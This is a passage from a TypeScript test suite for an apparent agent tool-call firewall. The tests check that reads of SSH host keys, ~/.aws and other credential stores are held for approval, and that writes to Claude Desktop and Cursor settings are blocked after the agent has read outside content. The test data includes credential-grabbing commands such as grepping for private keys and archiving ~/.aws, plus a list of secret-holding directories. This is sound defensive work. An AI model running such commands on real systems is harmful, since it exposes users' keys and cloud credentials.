      expect(d.verdict, `${path}: ${explain(d)}`).toBe("ask");
      expect(d.rules, `${path}: ${explain(d)}`).toContain("FW-CREDENTIAL-READ");
    }
  });
  it("a symlinked alias of such a directory is swept as the directory itself", () => {
    const links: Record<string, string> = { [`${WS}/hostkeys`]: "/etc/ssh", [`${WS}/cloud`]: `${HOME}/.aws` };
    const realpath = (p: string): string => links[p] ?? p;
    for (const cmd of ["grep -r PRIVATE hostkeys", "tar czf /tmp/c.tgz cloud"]) {
      const d = bash(cmd, { ctx: { caseInsensitive: false, realpath } });
      expect(d.verdict, `${cmd}: ${explain(d)}`).toBe("ask");
      expect(d.rules, `${cmd}: ${explain(d)}`).toContain("FW-CREDENTIAL-READ");
    }
  });
  it("FZ1: a long glob full of brackets is compared with the stores in time linear in its length", () => {
    // Bracket expressions read with a backtracking regular expression at every store comparison take over a second
    // here (the shell fuzzer's seed 26719 found it in a draft of this change).
    for (const p of [`/${"[".repeat(4000)}`, `/etc/ssh/${"[a".repeat(2000)}`, `/${"[".repeat(2000)}/${"*".repeat(2000)}`]) {
      for (const cmd of [`cat ${p}`, `chmod -R 777 ${p}`, `grep -r x ${p}`]) {
        const t0 = performance.now();
        bash(cmd, LINUX);
        expect(performance.now() - t0, cmd.slice(0, 40)).toBeLessThan(400);
      }
    }
  });
  it("the classification: which globs name a store, and which directories hold one", () => {
    expect(info("/etc/ssh/ssh_host_*").globNamesStore).toBe(true);
    expect(info("/etc/ss*/ssh_host_rsa_key").globNamesStore).toBe(true);
    for (const p of ["/etc/ssh/ssh_host_*.pub", "/etc/ssh/moduli*", "/etc/*.conf", "/etc/**/*.conf", `${WS}/src/*.ts`]) expect(info(p).globNamesStore, p).toBeUndefined();
    for (const d of ["/", "/etc", "/etc/ssh", "/run", "/run/secrets", "/var", "/var/run", "/proc", "/proc/1", `${HOME}/.ssh`, `${HOME}/.local/share/keyrings`]) expect(containsCredentialStores(d, lin), d).toBe(true);
    for (const d of ["/etc/nginx", "/etc/ssh/moduli", "/var/log", "/run/user/1000", "/usr", `${HOME}/proj`, `${HOME}/.cargo`]) expect(containsCredentialStores(d, lin), d).toBe(false);
  });
  it("controls: other reads of /etc, /run and /var, and listings of the key files, are unchanged", () => {
    const READS = [
      "cat /etc/hosts",
      "cat /etc/ssh/sshd_config",
      "cat /etc/ssh/ssh_host_*.pub",
      "cat /etc/ssh/ssh_host_*_key.pub",
      "cat /etc/*.conf",
      "cat /etc/**/*.conf",
      "cat /etc/**/**/*.conf",
      "grep -r listen /etc/nginx",
      "cp -r /etc/nginx /tmp/nginx",
      "tar czf /tmp/logs.tgz /var/log",
      "grep -r x /run/user/1000",
      "ls /etc/ssh",
      "ls -l /etc/ssh/ssh_host_*",
      "find /etc/ssh -name 'ssh_host_*'",
    ];
    for (const cmd of READS) {
      const d = bash(cmd, LINUX);
      expect(d.verdict, `${cmd}: ${explain(d)}`).toBe("allow");
      expect(d.rules, `${cmd}: ${explain(d)}`).not.toContain("FW-CREDENTIAL-READ");
    }
    for (const d of [run("Glob", { pattern: "/etc/ssh/ssh_host_*" }, LINUX), run("Grep", { pattern: "listen", path: "/etc/nginx" }, LINUX), run("Read", { file_path: "/etc/ssh/ssh_host_*.pub" }, LINUX)]) {
      expect(d.verdict, explain(d)).toBe("allow");
      expect(d.rules, explain(d)).not.toContain("FW-CREDENTIAL-READ");
    }
    // A listing of the key files shows their names: outside content, as before, not a read of the keys.
    const ls = bash("ls -l /etc/ssh/ssh_host_*", LINUX);
    expect(ls.effects.some((e) => e.cls === "read_external" && e.taints === true), explain(ls)).toBe(true);
    expect(ls.effects.some((e) => e.cls === "read_secret"), explain(ls)).toBe(false);
  });
});

describe("I7: Claude Desktop's and Cursor's settings on Linux are protected like the macOS ones", () => {
  it("~/.config/Claude (the real spelling) and ~/.config/Cursor/User/settings.json", () => {
    expect(info(`${HOME}/.config/Claude/claude_desktop_config.json`).protected).toBe(true);
    expect(info(`${HOME}/.config/Claude/Local Storage/x`).protected).toBe(true);
    expect(info(`${HOME}/.config/Cursor/User/settings.json`).protected).toBe(true);
    // The macOS paths they mirror.
    expect(info(`${HOME}/Library/Application Support/Claude/claude_desktop_config.json`).protected).toBe(true);
    expect(info(`${HOME}/Library/Application Support/Cursor/User/settings.json`).protected).toBe(true);
  });
  it("a write after outside content is held", () => {
    for (const p of [`${HOME}/.config/Claude/claude_desktop_config.json`, `${HOME}/.config/Cursor/User/settings.json`]) {
      const d = run("Write", { file_path: p, content: "{}" }, { ...LINUX, tainted: true });
      expect(NOT_ALLOWED, `${p}: ${explain(d)}`).toContain(d.verdict);
      expect(d.rules, `${p}: ${explain(d)}`).toContain("FW-INSTRUCTIONS-HELD");
    }
  });
  it("controls: the rest of Cursor's user directory and the other editors' directories are not claimed", () => {
    for (const p of [`${HOME}/.config/Cursor/User/keybindings.json`, `${HOME}/.config/Cursor/logs/x.log`, `${HOME}/.config/Cursorish/User/settings.json`]) expect(info(p).protected, p).toBe(false);
  });
});
